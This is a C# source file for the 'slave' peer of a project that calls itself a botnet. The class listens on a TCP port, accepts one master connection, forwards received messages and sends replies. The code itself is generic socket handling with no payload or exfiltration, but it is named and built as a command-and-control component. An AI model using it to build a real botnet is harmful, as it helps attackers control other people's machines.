using CozyThunder.Botnet.Common;
using CozyThunder.Botnet.Interface;
using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace CozyThunder.Botnet.Slave
{
    public class SlavePeer : Peer, ISlavePeer
    {
        ISlavePeerListener listener_;
        TcpListener tcpListener_;
        Socket master_;

        void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                TcpListener listener = (TcpListener)ar.AsyncState;
                Socket client = listener.EndAcceptSocket(ar);
                master_ = client;

                listener_?.OnConnect(client.RemoteEndPoint.ToString());
                StateObject state = new StateObject();
                state.workSocket = client;
                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
            catch { }
        }

        void ReadCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;
            try
            {
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead > 0)
                {
                    listener_?.OnMessage(state.buffer.Take(bytesRead).ToArray());
                }
                handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
            catch
            {
                tcpListener_.Stop();
                tcpListener_ = new TcpListener(EndPoint);
                tcpListener_.Start(1);
                tcpListener_.BeginAcceptSocket(AcceptCallback, tcpListener_);

                listener_?.OnDisConnect();
            }
        }

        void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket handler = (Socket)ar.AsyncState;
                int bytesSent = handler.EndSend(ar);
            }
            catch {}
        }

        public void Send(String data)
        {
            byte[] byteData = Encoding.ASCII.GetBytes(data);
            master_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), master_);
        }

        public void Send(byte[] byteData)
        {
            master_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), master_);
        }

        public bool Start(IPAddress ip, int port, ISlavePeerListener listener)
        {
            listener_ = listener;
            EndPoint = new IPEndPoint(ip, port);

            try
            {
                tcpListener_ = new TcpListener(EndPoint);
                tcpListener_.Start(1);
                tcpListener_.BeginAcceptSocket(AcceptCallback, tcpListener_);
            }
            catch (SocketException)
            {
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            tcpListener_.Stop();
            return true;
        }
    }
}
